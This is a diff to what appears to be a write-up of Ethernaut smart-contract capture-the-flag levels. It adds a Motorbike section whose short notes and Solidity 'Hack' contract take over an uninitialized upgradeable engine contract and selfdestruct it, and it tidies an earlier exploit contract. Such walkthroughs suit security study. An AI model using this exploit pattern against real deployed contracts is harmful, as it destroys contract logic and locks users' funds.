@@ -430,8 +430,28 @@ contract Hack {
 
         // set admin
         wallet.setMaxBalance(uint256(uint160(msg.sender)));
-     }
+    }
 ```
 
 # 24. Motorbike
+* Here the important thing we have to do is going through the upgrader variable then we will see that initialize() was not called by the implementaion contract and upgrader is empty.
+* When we call the initialize() we can become the upgrader and change the implementation contract to our malicious contract and calling selfdestruct on that makes the proxy into a permananent block where the funds send to the Motorbike will get stuck in that contract.
+* Here we can get the address of implementation contract by passing _IMPLEMENTATION_SLOT into web3.eth.getStorageAt() as await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc").
+```
+interface IEngine {
+    function upgrader() external view returns(address);
+    function initialize() external;
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+contract Hack {
 
+    function pwn(IEngine target) external {
+        target.initialize();
+        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
+    }  
+
+    function kill() external {
+        selfdestruct(payable(address(0)));
+    }
+}
+```
